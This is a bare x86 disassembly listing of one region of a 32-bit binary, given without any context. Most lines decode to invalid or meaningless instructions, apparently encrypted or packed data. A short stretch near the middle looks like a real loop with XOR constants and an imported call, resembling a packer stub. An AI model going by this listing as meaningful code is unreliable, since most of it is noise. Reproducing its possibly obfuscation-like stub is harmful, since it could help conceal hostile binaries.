  4087ff:	jmp    0xc062:0x77366e2f
  408806:	neg    DWORD PTR [edi]
  408808:	mov    ch,0x82
  40880a:	sub    eax,0xa744d647
  40880f:	fwait
  408810:	mov    cl,0x8a
  408812:	xlat   BYTE PTR ds:[ebx]
  408813:	jmp    0x408891
  408815:	cdq    
  408816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408817:	push   esi
  408818:	stc    
  408819:	xchg   ecx,eax
  40881a:	clc    
  40881b:	cmp    eax,0x9f3aaa8e
  408820:	(bad)  
  408821:	sbb    al,0x25
  408823:	dec    ebx
  408824:	repz sti 
  408826:	add    eax,0xfc679644
  40882b:	inc    eax
  40882c:	push   0x7bf3831a
  408831:	imul   edi,DWORD PTR [edi],0xd28813a9
  408837:	fdivr  QWORD PTR [edi+0x23]
  40883a:	fcomp  QWORD PTR [ebp+0x6f]
  40883d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40883e:	not    BYTE PTR [ebx]
  408840:	shl    BYTE PTR [eax+0x48fe3786],cl
  408846:	adc    dl,dh
  408848:	adc    eax,0x3e27c2a0
  40884d:	pop    ss
  40884e:	retf   
  40884f:	arpl   WORD PTR [ebx-0x72],dx
  408852:	leave  
  408853:	jo     0x40883a
  408855:	(bad)  
  408856:	in     eax,dx
  408857:	daa    
  408858:	mov    cl,0xbd
  40885a:	dec    edx
  40885b:	bound  esi,QWORD PTR [esi-0x16d433c5]
  408861:	div    BYTE PTR [edx+0x104fca8e]
  408867:	mov    ecx,DWORD PTR [edx+eax*8+0x5e]
  40886b:	test   al,0x2b
  40886d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40886e:	cli    
  40886f:	inc    ebx
  408870:	add    ebp,0xffffffb9
  408873:	rcl    BYTE PTR [edi+eiz*1],cl
  408876:	cli    
  408877:	mov    ebx,0xaaabb1f0
  40887c:	in     al,0xc8
  40887e:	inc    eax
  40887f:	ins    DWORD PTR es:[edi],dx
  408880:	enterw 0x3ef5,0xfb
  408885:	std    
  408886:	and    eax,0x6537fb94
  40888b:	sbb    bh,BYTE PTR [eax]
  40888d:	ret    
  40888e:	clc    
  40888f:	add    DWORD PTR [ebp+0x6c],0xffffffd2
  408893:	sub    bl,ah
  408895:	and    BYTE PTR [ebp-0x16],0x5a
  408899:	test   DWORD PTR [edx+0x140dc846],0x5c46af68
  4088a3:	out    0xa3,eax
  4088a5:	ss jmp 0xd85bf02f
  4088ab:	es scas al,BYTE PTR es:[edi]
  4088ad:	xlat   BYTE PTR ds:[ebx]
  4088ae:	mov    ch,0x39
  4088b0:	xor    eax,0x8a89c1a5
  4088b5:	xor    bh,al
  4088b7:	xchg   esi,eax
  4088b8:	mov    ch,0xcc
  4088ba:	iret   
  4088bb:	adc    eax,0xb5f660ec
  4088c0:	not    ebx
  4088c2:	mov    WORD PTR [ebx-0x43],fs
  4088c5:	cmp    BYTE PTR [ecx-0x80],al
  4088c8:	xor    al,BYTE PTR [ecx]
  4088ca:	fistp  DWORD PTR [eax-0x51]
  4088cd:	shl    BYTE PTR [edi+0x26f36473],cl
  4088d3:	shr    DWORD PTR [esi+0x47],1
  4088d6:	mov    edx,0xff636f44
  4088db:	sar    al,1
  4088dd:	jno    0x4088bb
  4088df:	mov    ds,edx
  4088e1:	add    DWORD PTR [edi-0x3760c7f8],esi
  4088e7:	jo     0x408930
  4088e9:	mov    ds:0xc738e361,eax
  4088ee:	inc    esp
  4088ef:	mov    ebx,0xd9912811
  4088f4:	or     al,0x79
  4088f6:	inc    eax
  4088f7:	mov    cl,0x1
  4088f9:	sbb    eax,0xa7b2f97
  4088fe:	inc    ecx
  4088ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408900:	sub    DWORD PTR [edx-0x686f01db],edi
  408906:	ds inc ebx
  408908:	out    dx,eax
  408909:	xchg   esp,eax
  40890a:	or     BYTE PTR [edx+0x3],ch
  40890d:	sub    BYTE PTR [edi],bh
  40890f:	out    dx,eax
  408910:	mov    ebp,0x52923258
  408915:	mov    al,ds:0x97da5104
  40891a:	int    0x1
  40891c:	xchg   esp,eax
  40891d:	xchg   DWORD PTR [edx+0x4031902b],ebx
  408923:	mov    al,ds:0x48b93731
  408928:	sub    al,0xb2
  40892a:	mov    edi,0x58b4b5e6
  40892f:	sub    DWORD PTR ds:0xe86b1a55,ebx
  408935:	mov    dl,0x9c
  408937:	mov    BYTE PTR [ebp-0x27495a2b],dh
  40893d:	jge    0x408906
  40893f:	push   edi
  408940:	adc    eax,0x6b3a86df
  408945:	dec    ecx
  408946:	mov    ebx,DWORD PTR [ecx]
  408948:	fmul   QWORD PTR [ebp+0x501da05c]
  40894e:	pop    ecx
  40894f:	mov    bl,0x4c
  408951:	jb     0x40898f
  408953:	cwde   
  408954:	xor    BYTE PTR [ecx-0x668874ab],ah
  40895a:	or     edi,edi
  40895c:	jg     0x40899d
  40895e:	sub    dh,BYTE PTR [esi+0x7c482e9e]
  408964:	mov    bl,0xcc
  408966:	xchg   ecx,eax
  408967:	pop    esp
  408968:	xchg   edx,eax
  408969:	shr    BYTE PTR [ebp+0x51f6f7df],0xe6
  408970:	gs adc al,0xf6
  408973:	(bad)  
  408975:	jb     0x40893b
  408977:	hlt    
  408978:	repnz cmc 
  40897a:	inc    edi
  40897b:	mov    esp,0x306ca28c
  408980:	mov    dh,0x65
  408982:	pop    esi
  408983:	repz dec ebp
  408985:	out    dx,eax
  408986:	sub    eax,0xd3079b1d
  40898b:	int    0x1b
  40898d:	lds    esp,FWORD PTR [edx]
  40898f:	ds xor eax,0xc2415819
  408995:	stc    
  408996:	repnz sub bh,BYTE PTR [esi]
  408999:	leave  
  40899a:	std    
  40899b:	sub    eax,0x59d705a2
  4089a0:	mov    ecx,0xda4a52df
  4089a5:	aam    0xf9
  4089a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089a8:	test   al,0xa
  4089aa:	arpl   di,cx
  4089ac:	cmp    ch,BYTE PTR [ebx+0x4b38f7ef]
  4089b2:	dec    ecx
  4089b3:	out    dx,eax
  4089b4:	xchg   DWORD PTR [ebp-0x15],edi
  4089b7:	cmp    eax,0xe17d7430
  4089bc:	mov    ch,0x65
  4089be:	cdq    
  4089bf:	jne    0x408956
  4089c1:	dec    eax
  4089c2:	enter  0x8321,0xbc
  4089c6:	fs push edx
  4089c8:	jecxz  0x40897b
  4089ca:	out    dx,eax
  4089cb:	stc    
  4089cc:	cmc    
  4089cd:	mov    bh,0x73
  4089cf:	jge    0x4089ba
  4089d1:	hlt    
  4089d2:	sar    edx,0x52
  4089d5:	add    eax,0x77294373
  4089da:	das    
  4089db:	mov    al,gs:0x9fa72f6e
  4089e1:	fadd   DWORD PTR [edx-0x2f]
  4089e4:	mov    al,0xbb
  4089e6:	inc    edi
  4089e7:	dec    ebx
  4089e8:	mov    ebp,DWORD PTR [eax+0x7bd3dd87]
  4089ee:	(bad)  
  4089ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089f0:	push   0x38
  4089f2:	mov    cl,ah
  4089f4:	sbb    ch,BYTE PTR [edi]
  4089f6:	lods   eax,DWORD PTR ds:[esi]
  4089f7:	mov    cs,esi
  4089f9:	pop    ss
  4089fa:	mov    esi,0xde36580a
  4089ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a00:	ins    BYTE PTR es:[edi],dx
  408a01:	jecxz  0x408a51
  408a03:	data16 or BYTE PTR [edx],bl
  408a06:	jno    0x408a63
  408a08:	(bad)  
  408a0a:	and    BYTE PTR [esi+0x18f9dba],bh
  408a10:	jne    0x408a1f
  408a12:	add    al,0x99
  408a14:	scas   al,BYTE PTR es:[edi]
  408a15:	and    dh,dh
  408a17:	sbb    DWORD PTR [ecx-0x31],edi
  408a1a:	test   DWORD PTR [ebp+0xf960c04],0x24de1bef
  408a24:	jge    0x408a4f
  408a26:	push   esi
  408a27:	gs pop edi
  408a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a2a:	js     0x408a25
  408a2c:	mov    al,ds:0x4092bbae
  408a31:	add    DWORD PTR [esi+0x28b46a2a],ebx
  408a37:	fs pop ss
  408a39:	mov    dh,0x4b
  408a3b:	or     dh,BYTE PTR [ecx-0x7d5fe1ce]
  408a41:	ja     0x408a01
  408a43:	sub    BYTE PTR [ebx],bl
  408a45:	(bad)  
  408a46:	fsubr  QWORD PTR [ebx]
  408a48:	pop    edi
  408a49:	nop
  408a4a:	call   0x5a893139
  408a4f:	push   0x7a
  408a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a52:	fdivr  QWORD PTR [ecx+0x19]
  408a55:	pushf  
  408a56:	out    0xc6,eax
  408a58:	lahf   
  408a59:	xlat   BYTE PTR ds:[ebx]
  408a5a:	ja     0x408a18
  408a5c:	mov    edx,0x10c50692
  408a61:	cmp    al,BYTE PTR [ebx-0x2a88da0e]
  408a67:	je     0x408a2a
  408a69:	inc    ebx
  408a6a:	dec    edx
  408a6b:	sub    DWORD PTR [edx+ebx*8+0x5e0189c0],0xcc2c9
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0x76b3a4f9
  408a92:	leave  
  408a93:	or     al,BYTE PTR [edi]
  408a95:	cmp    ah,ah
  408a97:	js     0x408b11
  408a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9a:	jle    0x408b14
  408a9c:	js     0x408b0d
  408a9e:	call   0x4aad19ad
  408aa3:	cmp    al,0xe5
  408aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408aa6:	int    0x67
  408aa8:	xchg   DWORD PTR [ebx+eax*8-0x4b],edi
  408aac:	jmp    0x408abf
  408aae:	pushf  
  408aaf:	mov    ebx,0xc6e5674a
  408ab4:	mul    bl
  408ab6:	and    BYTE PTR [edx],cl
  408ab8:	in     eax,dx
  408ab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408aba:	outs   dx,DWORD PTR ds:[esi]
  408abb:	push   ds
  408abc:	inc    ebx
  408abd:	inc    esi
  408abe:	mov    dh,0x94
  408ac0:	xchg   DWORD PTR [esp+eax*8+0x6f6caeb],edx
  408ac7:	add    al,0x57
  408ac9:	xor    ebp,DWORD PTR [eax]
  408acb:	(bad)  
  408acc:	xchg   edx,eax
  408acd:	movd   DWORD PTR [ecx-0x4c],mm4
  408ad1:	mov    edx,0xd8ea4e9c
  408ad6:	mov    DWORD PTR [ebx],ebp
  408ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ad9:	cdq    
  408ada:	retf   
  408adb:	jecxz  0x408b17
  408add:	cld    
  408ade:	arpl   WORD PTR [eax-0x3b5f9b2b],cx
  408ae4:	or     cl,BYTE PTR [esi+0x7e]
  408ae7:	dec    eax
  408ae8:	fucomip st,st(1)
  408aea:	sti    
  408aeb:	add    edx,esi
  408aed:	xor    al,0xe1
  408aef:	ja     0x408a7c
  408af1:	xor    DWORD PTR [edi+0x1a],ebx
  408af4:	sbb    BYTE PTR [edi],dl
  408af6:	(bad)  
  408af7:	hlt    
  408af8:	sti    
  408af9:	add    al,0x8f
  408afb:	int3   
  408afc:	push   esi
  408afd:	fiadd  DWORD PTR [ecx]
  408aff:	dec    edi
  408b00:	js     0x408b39
  408b02:	mov    eax,0x4de67028
  408b07:	and    esp,ecx
  408b09:	retf   
  408b0a:	das    
  408b0b:	nop
  408b0c:	mov    edi,DWORD PTR [ecx-0x79941e52]
  408b12:	inc    edx
  408b13:	stos   DWORD PTR es:[edi],eax
  408b14:	mov    ch,BYTE PTR [ebx+eax*2]
  408b17:	push   eax
  408b18:	test   BYTE PTR [esi-0x5],dl
  408b1b:	dec    ecx
  408b1c:	pop    ds
  408b1d:	xchg   esi,ebp
  408b1f:	leave  
  408b20:	lods   eax,DWORD PTR ds:[esi]
  408b21:	adc    BYTE PTR [eax],bl
  408b23:	ret    
  408b24:	xchg   esp,eax
  408b25:	pop    esp
  408b26:	cld    
  408b27:	sub    BYTE PTR [ecx+0x460229d7],ah
  408b2d:	add    al,0x54
  408b2f:	jecxz  0x408b25
  408b31:	mov    BYTE PTR [esi],ah
  408b33:	jle    0x408ada
  408b35:	test   DWORD PTR [ebp-0x4986656a],esi
  408b3b:	clc    
  408b3c:	or     eax,0x175925cc
  408b41:	ret    0x6ac9
  408b44:	outs   dx,BYTE PTR ds:[esi]
  408b45:	leave  
  408b46:	sar    DWORD PTR [edi],0xa6
  408b49:	mov    eax,0x43e58e96
  408b4e:	add    BYTE PTR [edx],bl
  408b50:	sbb    ebx,ebx
  408b52:	push   es
  408b53:	mov    gs,WORD PTR [ecx]
  408b55:	cmp    ebx,DWORD PTR [eax]
  408b57:	daa    
  408b58:	xor    ah,BYTE PTR [edx-0x6f]
  408b5b:	pop    eax
  408b5c:	or     BYTE PTR [esi-0x39],0xbe
  408b60:	add    dl,dl
  408b62:	xor    al,0x6c
  408b64:	aam    0xe2
  408b66:	cmp    ah,BYTE PTR [ebp-0x16]
  408b69:	js     0x408aeb
  408b6b:	cs jnp 0x408bd5
  408b6e:	push   esp
  408b6f:	in     eax,dx
  408b70:	cwde   
  408b71:	push   esp
  408b72:	repz fnstsw WORD PTR [edi]
  408b75:	xchg   esi,eax
  408b76:	clc    
  408b77:	out    0xaa,eax
  408b79:	and    al,0x69
  408b7b:	in     al,dx
  408b7c:	pushf  
  408b7d:	loop   0x408b27
  408b7f:	xchg   esp,eax
  408b80:	dec    edx
  408b81:	ret    
  408b82:	leave  
  408b83:	rcl    DWORD PTR [edx+0xfb196ed],0x60
  408b8a:	or     al,0x1e
  408b8c:	push   edx
  408b8d:	mov    esi,0xa39ddced
  408b92:	xor    bl,BYTE PTR [ebx-0x25e262eb]
  408b98:	push   edx
  408b99:	sbb    ah,BYTE PTR [ebp-0x43d4bdca]
  408b9f:	xor    al,ch
  408ba1:	xor    edi,DWORD PTR [esi+ebx*4-0x35700deb]
  408ba8:	stos   BYTE PTR es:[edi],al
  408ba9:	test   BYTE PTR [eax+0x4297c8ef],0xac
  408bb0:	scas   al,BYTE PTR es:[edi]
  408bb1:	add    al,0x13
  408bb3:	daa    
  408bb4:	mov    dh,0x9e
  408bb6:	cdq    
  408bb7:	cwde   
  408bb8:	or     al,0x9f
  408bba:	pusha  
  408bbb:	je     0x408bc0
  408bbd:	ins    BYTE PTR es:[edi],dx
  408bbe:	scas   al,BYTE PTR es:[edi]
  408bbf:	pusha  
  408bc0:	or     esp,edx
  408bc2:	cmp    dl,BYTE PTR [edi-0x7a33e013]
  408bc8:	push   eax
  408bc9:	shl    BYTE PTR cs:[ecx],cl
  408bcc:	mov    eax,0x98a7468e
  408bd1:	loop   0x408bc9
  408bd3:	xor    eax,0xa1c400c2
  408bd8:	lods   al,BYTE PTR ds:[esi]
  408bd9:	retf   
  408bda:	sub    eax,0xf923f4a7
  408bdf:	cdq    
  408be0:	outs   dx,BYTE PTR ds:[esi]
  408be1:	xchg   BYTE PTR [eax],dl
  408be3:	or     DWORD PTR ds:[esi+0x6c9b9dec],esp
  408bea:	es fwait
  408bec:	jle    0x408b85
  408bee:	cmp    ebx,DWORD PTR [esi-0x5fefdad7]
  408bf4:	pop    ss
  408bf5:	cdq    
  408bf6:	out    dx,eax
  408bf7:	iret   
  408bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bf9:	pop    es
  408bfa:	pop    ebx
  408bfb:	enter  0x8e2d,0xdb
  408bff:	cmp    cl,ch
  408c01:	pop    ecx
  408c02:	repnz in al,0x9f
  408c05:	(bad)
  408c08:	sbb    al,0xc
  408c0a:	sar    bl,cl
  408c0c:	(bad)  
  408c0d:	repz adc dl,dl
  408c10:	push   0xffffffe6
  408c12:	mov    ebx,0x88a5bd64
  408c17:	jmp    0x408c75
  408c19:	lea    ebx,[ebx+0x7d]
  408c1c:	ja     0x408c0c
  408c1e:	pop    es
  408c1f:	ins    DWORD PTR es:[edi],dx
  408c20:	jmp    FWORD PTR [ebx+eiz*2]
  408c23:	lds    esi,FWORD PTR [esi-0x5c]
  408c26:	aaa    
  408c27:	add    eax,0x10e49631
  408c2c:	xchg   DWORD PTR [esp+esi*8-0x1b],ebp
  408c30:	add    al,0x9f
  408c32:	aam    0x5
  408c34:	ss mov cl,0x81
  408c37:	int3   
  408c38:	ins    DWORD PTR es:[edi],dx
  408c39:	fidivr DWORD PTR [eax-0x4f]
  408c3c:	sbb    eax,0xcbfe8d1b
  408c41:	dec    edx
  408c42:	arpl   WORD PTR [edi+0x2292c93c],bx
  408c48:	in     eax,dx
  408c49:	ret    
  408c4a:	fnstcw WORD PTR [ebx-0xe4bcd64]
  408c50:	push   ebp
  408c51:	aam    0x6c
  408c53:	loopne 0x408ca4
  408c55:	imul   edi,DWORD PTR [edi+ebx*1+0x16374598],0x3e
  408c5d:	inc    ebp
  408c5e:	sbb    ebx,esp
  408c60:	jge    0x408ca4
  408c62:	xor    eax,0x60bbbbc8
  408c67:	adc    al,BYTE PTR [ebx]
  408c69:	data16 (bad) 
  408c6b:	jmp    0x7815:0x98b6264c
  408c72:	jmp    DWORD PTR [edx-0x44]
  408c75:	jmp    0x408ccc
  408c77:	frstor [esi]
  408c79:	pushf  
  408c7a:	mov    BYTE PTR [edi+0x32],dh
  408c7d:	adc    eax,eax
  408c7f:	jge    0x408c0f
  408c81:	outs   dx,BYTE PTR ds:[esi]
  408c82:	mov    eax,0xeda51074
  408c87:	rcl    bh,0xb1
  408c8a:	ja     0x408c4c
  408c8c:	leave  
  408c8d:	cs inc edi
  408c8f:	pop    edx
  408c90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c91:	ja     0x408c95
  408c93:	or     cl,bh
  408c95:	mov    ebp,0xc4c5c60
  408c9a:	push   ebx
  408c9b:	jge    0x408cee
  408c9d:	push   ss
  408c9e:	test   eax,0x817f09be
  408ca3:	jmp    FWORD PTR [ebx]
  408ca5:	add    eax,0xe2d8a5d7
  408caa:	jp     0x408ce0
  408cac:	aam    0xdd
  408cae:	es and al,0x4
  408cb1:	pusha  
  408cb2:	inc    eax
  408cb3:	ins    BYTE PTR es:[edi],dx
  408cb4:	shl    BYTE PTR [bp+si-0x17b4],1
  408cb9:	inc    edi
  408cba:	adc    BYTE PTR [edi],bl
  408cbc:	xchg   edi,eax
  408cbd:	ret    
  408cbe:	fst    DWORD PTR [ebp+edi*2-0x1a12b2d]
  408cc5:	or     ebx,esp
  408cc7:	pop    ebx
  408cc8:	out    0x47,al
  408cca:	pop    esi
  408ccb:	outs   dx,BYTE PTR ds:[esi]
  408ccc:	xor    ah,0x4e
  408ccf:	push   ebp
  408cd0:	loopne 0x408d33
  408cd2:	inc    eax
  408cd3:	cmp    al,0x73
  408cd5:	(bad)  [ebp-0x6a]
  408cd8:	mov    al,ds:0x144a1c48
  408cdd:	xchg   esp,eax
  408cde:	adc    al,0x92
  408ce0:	inc    edx
  408ce1:	scas   eax,DWORD PTR es:[edi]
  408ce2:	lea    esi,[esi-0x5d]
  408ce5:	pop    ds
  408ce6:	mov    ds,WORD PTR [edx-0x19]
  408ce9:	add    ecx,edi
  408ceb:	(bad)  
  408cec:	jne    0x408cf3
  408cee:	mov    edx,0x80fede28
  408cf3:	shr    ebp,cl
  408cf5:	xor    BYTE PTR [ebp+0x2fd451d1],0xfb
  408cfc:	adc    DWORD PTR [ebx],ebp
  408cfe:	sbb    DWORD PTR [edx],ebx
  408d00:	outs   dx,BYTE PTR ds:[esi]
  408d01:	sub    ecx,DWORD PTR ds:0x20b332c6
  408d07:	pop    ebx
  408d08:	push   ebp
  408d09:	fadd   DWORD PTR [edx+0x7d]
  408d0c:	add    DWORD PTR [ebx-0x114bebf6],ecx
  408d12:	sbb    ebx,esi
  408d14:	push   ds
  408d15:	sbb    BYTE PTR [esp+esi*4+0x1ef8ea8a],dh
  408d1c:	inc    eax
  408d1d:	test   BYTE PTR [ecx+edi*8],dl
  408d20:	ins    BYTE PTR es:[edi],dx
  408d21:	repnz mov bl,0x29
  408d24:	sub    al,0x59
  408d26:	popf   
  408d27:	sub    edi,DWORD PTR [edx+0x1421d85d]
  408d2d:	xchg   DWORD PTR [esi],eax
  408d2f:	std    
  408d30:	sti    
  408d31:	mov    ds:0xbb4af113,al
  408d36:	jg     0x408db7
  408d38:	add    al,0x54
  408d3a:	inc    esp
  408d3b:	rcr    DWORD PTR [edx+ebp*1],cl
  408d3e:	sub    DWORD PTR [ecx-0x4f97331],ecx
  408d44:	fs mov dh,0xc7
  408d47:	inc    ebp
  408d48:	clc    
  408d49:	cmp    BYTE PTR [ebp+0x45c7f89c],al
  408d4f:	cld    
  408d50:	cmp    DWORD PTR [ebp+0x458bf89c],eax
  408d56:	cld    
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42a86d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a88d,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7c1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7c1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7c1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7c1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7c1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7c1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7c1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7c1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a7f5
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7bd
  408de2:	mov    DWORD PTR ds:0x42a7f5,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a809,0x42a765
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a77d,0x42a7f9
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0x6a
  408e1d:	push   ebx
  408e1e:	sbb    edi,esp
  408e20:	addr16 jmp 0x7878:0x7ea77878
  408e28:	push   esi
  408e29:	inc    ebx
  408e2a:	xchg   esi,eax
  408e2b:	pop    ss
  408e2c:	xchg   DWORD PTR [edx-0x2c3c713c],ebx
  408e32:	adc    al,0xa4
  408e34:	ja     0x408dde
  408e36:	cs pop ecx
  408e38:	xor    al,0xfe
  408e3a:	iret   
  408e3b:	jp     0x408e9d
  408e3d:	ficom  WORD PTR [edx]
  408e3f:	test   al,0xb9
  408e41:	inc    eax
  408e42:	or     al,dh
  408e44:	dec    ecx
  408e45:	les    ecx,FWORD PTR [ebp+0x3d871d6c]
  408e4b:	imul   BYTE PTR [esi+ecx*2+0x7b]
  408e4f:	out    dx,al
  408e50:	inc    edi
  408e51:	stos   DWORD PTR es:[edi],eax
  408e52:	push   ss
  408e53:	dec    edx
  408e54:	ror    BYTE PTR [bx+di],0x3c
  408e58:	(bad)  [edi+0x1e9e7f6a]
  408e5e:	aas    
  408e5f:	dec    ebp
  408e60:	pop    esp
  408e61:	icebp  
  408e62:	sub    BYTE PTR [eax*1-0x46aad7ec],0x86
  408e6a:	cwde   
  408e6b:	daa    
  408e6c:	add    esp,edi
  408e6e:	sub    ecx,DWORD PTR [esi+0x50]
  408e71:	xor    al,BYTE PTR [ecx]
  408e73:	mov    WORD PTR [eax+0xf81ff85],es
  408e79:	inc    eax
  408e7a:	add    BYTE PTR ds:0xd63c8f0,0x83
  408e81:	adc    al,0x48
  408e83:	push   ds
  408e84:	jge    0x408ec0
  408e86:	dec    ebp
  408e87:	popf   
  408e88:	rol    ecx,0xb5
  408e8b:	outs   dx,BYTE PTR ds:[esi]
  408e8c:	dec    edi
  408e8d:	or     BYTE PTR [ebx+0x22],dh
  408e90:	test   eax,0xd86fd3a0
  408e95:	(bad)  
  408e97:	mov    bh,0x4
  408e99:	xor    eax,0xa04eb32c
  408e9e:	adc    DWORD PTR [ebx+edx*1+0x55],esi
  408ea2:	call   0xd4a6:0x108af092
  408ea9:	int3   
  408eaa:	push   esi
  408eab:	jno    0x408f21
  408ead:	into   
  408eae:	call   0x68b85bb6
  408eb3:	mov    edi,0x283c55f9
  408eb8:	dec    ebp
  408eb9:	fdiv   DWORD PTR [ebx]
  408ebb:	stc    
  408ebc:	mov    edi,0x2bbd8ce4
  408ec1:	jl     0x408e7f
  408ec3:	push   cs
  408ec4:	mov    ds:0xf5f439a6,al
  408ec9:	mov    ebp,0xcae7b453
  408ece:	adc    al,bh
  408ed0:	ror    BYTE PTR [ebp-0x52],1
  408ed3:	jnp    0x408ebe
  408ed5:	rcr    BYTE PTR [eax+0x67],cl
  408ed8:	mov    ebp,0x52a6ffcc
  408edd:	xor    al,0xe8
  408edf:	pop    ds
  408ee0:	int3   
  408ee1:	ret    0x5e5a
  408ee4:	int3   
  408ee5:	stc    
  408ee6:	mov    ds:0xaae8244,al
  408eeb:	sar    BYTE PTR [edx],0x7d
  408eee:	mov    esi,0xb95d5338
  408ef3:	idiv   eax
  408ef5:	pop    ss
  408ef6:	and    al,0x6e
  408ef8:	ins    DWORD PTR es:[edi],dx
  408ef9:	jmp    FWORD PTR [edi]
  408efb:	adc    al,0x0
  408efd:	sub    DWORD PTR [edx+0x718529eb],ebx
  408f03:	jne    0x408ec7
  408f05:	out    0x8d,al
  408f07:	dec    ebp
  408f08:	rcr    DWORD PTR [ecx-0x69148f3a],1
  408f0e:	ins    BYTE PTR es:[edi],dx
  408f0f:	popf   
  408f10:	push   ecx
  408f11:	mov    al,ds:0xb308bc6a
  408f16:	std    
  408f17:	sub    eax,0x9bc69b3d
  408f1c:	add    al,0x5e
  408f1e:	sub    ch,0xee
  408f21:	mov    DWORD PTR [ebp+0x76a022cf],ecx
  408f27:	mov    al,ds:0x8d16dc20
  408f2c:	imul   ecx,ebp,0x59
  408f2f:	jmp    0xdba79089
  408f34:	mov    esi,0xbdef2345
  408f39:	cmp    eax,0x2b275a7b
  408f3e:	mul    BYTE PTR [edx+0x2a]
  408f41:	mov    esp,0x753b9d1a
  408f46:	add    BYTE PTR [eax+0x34450b60],cl
  408f4c:	add    ah,BYTE PTR [edi]
  408f4e:	adc    BYTE PTR [esi-0x69bd9086],0xc1
  408f55:	std    
  408f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f57:	xchg   BYTE PTR [ebp-0x19],al
  408f5a:	mov    bl,0xa3
  408f5c:	mov    dh,0xc0
  408f5e:	outs   dx,DWORD PTR ds:[esi]
  408f5f:	in     eax,dx
  408f60:	mov    edi,0x2de9ce3e
  408f65:	mov    esp,0x6be85a50
  408f6a:	mov    esi,0x18e1786b
  408f6f:	jnp    0x408fb2
  408f71:	cwde   
  408f72:	out    dx,eax
  408f73:	xor    BYTE PTR [edi+0x67e24a4a],cl
  408f79:	lahf   
  408f7a:	mov    eax,ds:0x35a9824a
  408f7f:	cli    
  408f80:	dec    esp
  408f81:	xchg   ecx,eax
  408f82:	sub    al,0x4
  408f84:	ret    
  408f85:	mov    ds:0x606fefd0,al
  408f8a:	add    al,0xd9
  408f8c:	push   cs
  408f8d:	out    0xe0,al
  408f8f:	sbb    eax,0x7d68dbbf
  408f94:	mov    al,0x50
  408f96:	adc    DWORD PTR [ebx],0x972f5067
  408f9c:	int3   
  408f9d:	dec    eax
  408f9e:	xchg   DWORD PTR [eax],ecx
  408fa0:	xor    al,0x5
  408fa2:	dec    esi
  408fa3:	add    al,ch
  408fa5:	mov    ds:0xbe924f38,eax
  408faa:	add    al,0x89
  408fac:	push   ebp
  408fad:	dec    ebp
  408fae:	add    BYTE PTR [eax+0x67],dh
  408fb1:	dec    ebp
  408fb2:	xor    esp,DWORD PTR [esi+edi*1+0x5b]
  408fb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fb7:	inc    ebx
  408fb8:	mov    al,ds:0x104dd1d0
  408fbd:	adc    BYTE PTR gs:[edi-0x609d206c],ch
  408fc4:	sub    eax,esp
  408fc6:	sbb    al,0x1e
  408fc8:	adc    bh,BYTE PTR [esi]
  408fca:	push   ds
  408fcb:	outs   dx,DWORD PTR ds:[esi]
  408fcc:	lahf   
  408fcd:	jle    0x408fa2
  408fcf:	pop    edi
  408fd0:	or     DWORD PTR [esi+0x1e9014a0],0x80281915
  408fda:	iret   
  408fdb:	loop   0x408fdf
  408fdd:	mov    al,ds:0xf04fc32f
  408fe2:	test   BYTE PTR [edi],cl
  408fe4:	push   ecx
  408fe5:	mov    al,0x5d
  408fe7:	xchg   edx,eax
  408fe8:	repnz (bad) 
  408fea:	sub    cl,BYTE PTR [eax+ecx*1]
  408fed:	lods   eax,DWORD PTR ds:[esi]
  408fee:	aaa    
  408fef:	or     esi,esp
  408ff1:	test   ebp,0x28f55661
